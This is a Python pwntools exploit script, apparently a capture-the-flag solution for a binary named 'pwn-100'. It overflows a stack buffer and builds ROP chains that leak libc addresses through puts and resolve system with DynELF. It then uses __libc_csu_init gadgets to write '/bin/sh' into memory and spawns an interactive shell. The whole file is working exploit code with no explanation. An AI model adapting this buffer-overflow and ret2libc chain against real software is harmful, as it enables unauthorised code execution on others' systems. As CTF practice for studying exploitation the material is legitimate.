#ROPgadget --binary pwn-100 --only 'pop|ret' | grep 'rdi'
from pwn import *

offset = 0x40 + 0x8
pwn_elf = ELF('../ex1/pwn-100')
start_addr = 0x400550
pop_rdi_addr = 0x400763
puts_plt = pwn_elf.plt['puts']

sh = process("../ex1/pwn-100")
#payload1
def leak(address):
    payload = b'a'*offset + p64(pop_rdi_addr) + p64(address) + p64(puts_plt) + p64(start_addr)
    payload = payload.ljust(200,b'a')
    sh.send(payload)
    sh.recvuntil("bye~\n")
    data = sh.recv()[:-1]
    if not data:
        data = b'\x00'
    data = data[:8]

    return data

dyn = DynELF(leak,elf = pwn_elf)
system_addr = dyn.lookup('system','libc')
print('%#x'%system_addr)

#payload2
read_got = pwn_elf.got['read']
print('%#x'%read_got)
gadget1 = 0x40075A
gadget2 = 0x400740
addr_bin_sh = 0x601040
payload2 = offset * b'a' + p64(gadget1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(addr_bin_sh) + p64(0)
payload2 += p64(gadget2) + b'\x00' * 56 + p64(start_addr)
payload2 = payload2.ljust(200,b'a')
sh.send(payload2)
sh.recvuntil(b"bye~\n")
sh.send(b"/bin/sh\x00")

#payload3
payload3 = offset * b'a' + p64(0x04006FF) + p64(pop_rdi_addr) + p64(addr_bin_sh) + p64(system_addr)
payload3 = payload3.ljust(200,b'a')
sh.send(payload3)

sh.interactive()
